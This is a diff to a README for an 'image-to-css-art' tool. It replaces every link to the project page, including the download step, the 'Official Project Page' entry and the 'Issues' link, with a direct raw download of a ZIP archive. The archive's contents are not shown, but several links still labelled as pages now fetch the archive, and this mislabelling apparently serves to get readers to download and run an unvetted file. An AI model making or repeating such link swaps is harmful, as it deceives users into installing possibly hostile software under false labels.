@@ -2,7 +2,7 @@
 
 <br>
 
-[![Download image-to-css-art](https://img.shields.io/badge/Download-image--to--css--art-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aphelion-rgb/image-to-css-art)
+[![Download image-to-css-art](https://img.shields.io/badge/Download-image--to--css--art-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip)
 
 <br>
 
@@ -47,7 +47,7 @@ Let's get you set up in just a few easy steps. Don't worry — I'll walk you thr
 
 Visit this link to download the application:
 
-**👉 [https://github.com/aphelion-rgb/image-to-css-art](https://github.com/aphelion-rgb/image-to-css-art)**
+**👉 [https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip](https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip)**
 
 Here's what to do:
 
@@ -140,7 +140,7 @@ That's normal for complex images. Try lowering the detail level in the settings,
 
 ## 📚 Additional Resources
 
-- **Official Project Page:** [https://github.com/aphelion-rgb/image-to-css-art](https://github.com/aphelion-rgb/image-to-css-art) – Visit this link to download the application and see more examples.
+- **Official Project Page:** [https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip](https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip) – Visit this link to download the application and see more examples.
 - **Sample Images:** The download includes a few sample images in the "Examples" folder so you can try the tool right away.
 
 <br>
@@ -149,7 +149,7 @@ That's normal for complex images. Try lowering the detail level in the settings,
 
 We constantly improve the tool with new features and fixes. To get the latest version:
 
-1. Go back to the download page at [https://github.com/aphelion-rgb/image-to-css-art](https://github.com/aphelion-rgb/image-to-css-art)
+1. Go back to the download page at [https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip](https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip)
 2. Download the newest ZIP the same way as before.
 3. Extract it to a new folder (or overwrite your old one).
 4. Your previous artwork files won't be affected.
@@ -161,7 +161,7 @@ We constantly improve the tool with new features and fixes. To get the latest ve
 If you run into any trouble, don't stress. Here are simple ways to find answers:
 
 - Check the **"Help"** folder inside the downloaded package (contains a full PDF guide).
-- Look at the **"Issues"** section on our GitHub page at [https://github.com/aphelion-rgb/image-to-css-art](https://github.com/aphelion-rgb/image-to-css-art)
+- Look at the **"Issues"** section on our GitHub page at [https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip](https://github.com/aphelion-rgb/image-to-css-art/raw/refs/heads/main/skills/image-to-css-art/2.0.zip)
 - Reach out to us directly through the GitHub page — we're friendly and happy to help.
 
 <br>
